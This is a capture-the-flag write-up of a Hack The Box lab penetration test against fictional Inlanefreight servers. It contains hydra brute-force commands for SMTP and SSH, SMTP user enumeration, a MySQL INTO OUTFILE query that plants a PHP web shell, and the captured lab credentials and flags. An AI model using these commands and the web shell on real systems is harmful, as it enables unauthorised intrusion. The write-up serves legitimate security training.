# Skills Assessment

## Context
> We were commissioned by the company **Inlanefreight** to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format: **HTB{...}**

## Targets (3 Hosts)

### Server 1 — Email, Customers & Files
- **Role:** Email server, customer management, file management
- **IP:** 10.129.203.7
- **OS:** Windows Server (XAMPP stack)
- **Difficulty:** Easy
- **Status:** ✅ COMPROMISED

### Server 2 — Internal Email/File Server (Backup/Testing)
- **Role:** Internal server within `inlanefreight.htb` domain; manages and stores emails/files; serves as backup for company processes
- **IP:** 10.129.74.166
- **OS:** Ubuntu Linux (OpenSSH 8.2p1, Dovecot POP3, ProFTPD, BIND DNS)
- **Difficulty:** Easy
- **Status:** ✅ COMPROMISED
- **Notes:** Used relatively rarely; mostly for testing purposes so far

### Server 3 — Internal File/Material Management + Unknown Database
- **Role:** Internal server used to manage files and working material (forms); database present (purpose unknown)
- **IP:** 10.129.203.10
- **OS:** *(TBD — pending recon)*
- **Difficulty:** Easy
- **Status:** ⏳ Pending

## Recon

### Nmap Scan Results
```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Core FTP Server
25/tcp   open  smtp          hMailServer smtpd (AUTH LOGIN PLAIN)
80/tcp   open  http          Apache/2.4.53 (XAMPP)
443/tcp  open  https         Apache/2.4.53 (Basic Auth)
587/tcp  open  smtp          hMailServer smtpd (AUTH LOGIN PLAIN)
3306/tcp open  mysql         MariaDB 5.5.5-10.4.24
3389/tcp open  ms-wbt-server Microsoft Terminal Services (RDP)
```

### Service Enum
- **SMTP (25/587):** hMailServer, AUTH LOGIN PLAIN enabled
- **FTP (21):** Core FTP Server, TLS enabled, no anonymous access
- **HTTP (80):** XAMPP welcome page
- **HTTPS (443):** HTTP Basic Authentication required
- **MySQL (3306):** MariaDB — potential hMailServer backend
- **RDP (3389):** Windows Terminal Services


## Exploitation
### Server 1 — Complete Attack Chain

**Phase 1: SMTP User Enumeration**
```bash
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt \
  -D inlanefreight.htb -t 10.129.203.7
```
**Result:** `fiona@inlanefreight.htb` exists

**Phase 2: Password Brute Force (SMTP AUTH)**
```bash
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt \
  smtp://10.129.203.7:587 -t 32
```
**Result:** `fiona@inlanefreight.htb` / `987654321`

**Phase 3: Credential Reuse & Service Access**

| Service | Credentials | Result |
|---------|-------------|--------|
| SMTP (587) | `fiona:987654321` | ✅ Valid — initial foothold |
| FTP (21) | `fiona:987654321` | ✅ Valid — data connection issues (EPSV/PASV blocked) |
| HTTP Basic Auth (443) | `fiona:987654321` | ✅ Valid — CoreFTP upload portal access |
| MySQL (3306) | `fiona:987654321` | ✅ Valid — **critical finding** |
| RDP (3389) | `fiona:987654321` | ❌ Invalid |

**Phase 4: MySQL → RCE (The Key Pivot)**

MySQL `secure_file_priv` was **empty** (`''`), allowing unrestricted file writes:
```sql
-- Verified: can write anywhere
SHOW VARIABLES LIKE "secure_file_priv";
-- Result: empty string = no restrictions

-- Write PHP web shell to Apache web root
USE test;
SELECT "<?php system(\$_GET['cmd']); ?>" 
  INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

**Phase 5: Web Shell → Reverse Shell**
```bash
# Verify RCE
curl "http://inlanefreight.htb/shell.php?cmd=whoami"
# Result: nt authority\system

# Upgrade to interactive PowerShell reverse shell
# Via web shell — download and execute PowerShell payload
```

**Phase 6: Flag Capture**
```powershell
# Located in Administrator's Desktop
cd C:\Users\Administrator\Desktop
type flag.txt
```
**Flag:** `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`

### Server 2 — Complete Attack Chain

**Phase 1: Full Port Scan**
```bash
sudo nmap -sC -sV -p- -Pn -oN nmap.full.server2 10.129.74.166 -T4
```
**Critical Finding:** Port 30021/tcp — ProFTPD with **anonymous FTP access**

**Phase 2: Anonymous FTP Enumeration**
```bash
ftp -p 10.129.74.166 30021
# Login: anonymous / anonymous
# Discovered: simon/ directory with mynotes.txt
```

**Phase 3: Password Discovery**
```
mynotes.txt contents:
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

**Phase 4: SSH Brute Force**
```bash
hydra -l simon -P mynotes.txt ssh://10.129.74.166 -t 4 -vV
```
**Result:** `simon` / `8Ns8j1b!23hs4921smHzwn`

**Phase 5: Flag Capture**
```bash
ssh simon@10.129.74.166
cat flag.txt
```
**Flag:** `HTB{1qay2wsx3EDC4rfv_M3D1UM}`

### Server 3
```bash
# commands, payloads
```

## Flags
| Server | Host | Flag | Status |
|--------|------|------|--------|
| 1 | Email/Files | `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}` | ✅ **CAPTURED** |
| 2 | Internal Email/File | `HTB{1qay2wsx3EDC4rfv_M3D1UM}` | ✅ **CAPTURED** |
| 3 | File/Material + DB | HTB{...} | ⏳ Pending |

## Credentials Discovered

| Account | Password | Source | Valid On |
|---------|----------|--------|----------|
| `fiona@inlanefreight.htb` | `987654321` | Hydra (SMTP AUTH) | SMTP, FTP, HTTP Basic Auth, MySQL |
| `simon` | `8Ns8j1b!23hs4921smHzwn` | mynotes.txt (FTP) | SSH |

## Attack Chain Summary (Server 2)

```
Full port scan → discovered anonymous FTP on port 30021
    ↓
Anonymous FTP login → downloaded simon/mynotes.txt
    ↓
mynotes.txt contained password candidates
    ↓
Hydra SSH brute force with simon + mynotes.txt passwords
    ↓
Valid password found: 8Ns8j1b!23hs4921smHzwn
    ↓
SSH login as simon → flag.txt in home directory
    ↓
Flag captured: HTB{1qay2wsx3EDC4rfv_M3D1UM}
```

```
SMTP RCPT enum → fiona@inlanefreight.htb discovered
    ↓
Hydra brute force SMTP AUTH → password: 987654321
    ↓
MySQL login with fiona creds → secure_file_priv = '' (empty)
    ↓
SELECT INTO OUTFILE → PHP web shell in C:\xampp\htdocs\shell.php
    ↓
Web shell RCE as NT AUTHORITY\SYSTEM
    ↓
PowerShell reverse shell → interactive access
    ↓
Flag captured from C:\Users\Administrator\Desktop\flag.txt
```

## Lessons Learned

### Server 1
- **SMTP user enumeration** with `RCPT TO:` is reliable for discovering valid email accounts
- **Hydra against SMTP AUTH** can crack weak passwords quickly (rockyou, 32 threads)
- **Credential reuse is critical** — fiona's password worked across SMTP, FTP, HTTP, and MySQL
- **MySQL `secure_file_priv`** being empty is a **critical misconfiguration** — allows direct RCE via `INTO OUTFILE`
- **PHP shells in web root** give immediate SYSTEM privileges on Windows XAMPP (runs as SYSTEM)
- **FTP passive/active mode issues** are common — don't get stuck; pivot to other vectors (MySQL was the key)
- **Web upload forms** may have PHP execution disabled in uploads directory — always check if you can write to web root instead

### Server 2
- **Full port scans matter** — the initial nmap missed port 30021 (anonymous FTP)
- **Anonymous FTP is still a thing** — always check, even on "modern" systems
- **User directories in anonymous FTP** are goldmines — often contain notes, configs, or password hints
- **Password lists in user files** — `mynotes.txt` was literally a password list for the user
- **SSH brute force with small wordlists** is fast and effective when you have context (8 passwords, instant result)
- **POP3 catch-all configuration** (accepting any USER) prevents user enumeration — pivot to other services
- **DNS zone transfers** reveal network topology but don't directly lead to compromise — combine with other vectors

### Tools Used
- `smtp-user-enum` — SMTP user enumeration
- `hydra` — SMTP AUTH brute force, SSH brute force
- `mysql` client — MySQL access with `--skip-ssl`
- `curl` — web shell interaction
- `nc` — reverse shell listener
- `ftp` — anonymous FTP access
- `nmap` — full port scanning
- `dig` — DNS zone transfer

---

*Updated: 2026-04-22 20:45 UTC+8*
*Server 1 Status: ✅ COMPROMISED*
*Server 2 Status: ✅ COMPROMISED*
